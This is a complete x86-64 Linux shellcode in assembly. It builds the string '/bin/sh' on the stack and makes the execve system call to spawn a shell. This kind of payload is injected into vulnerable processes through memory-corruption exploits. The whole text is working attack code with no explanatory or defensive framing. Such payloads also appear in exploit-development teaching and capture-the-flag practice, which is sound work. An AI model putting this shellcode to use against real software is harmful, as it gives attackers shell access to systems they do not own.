.section .text
.globl _start

 
_start:
xor %rdi, %rdi
push %rdi
push %rdi
pop %rsi
pop %rdx
# Store '/bin/sh\0' in %rdi
movq $0x68732f6e69622f6a, %rdi
shr $0x8,%rdi
push %rdi
push %rsp
pop %rdi
push $0x3b
pop %rax
syscall
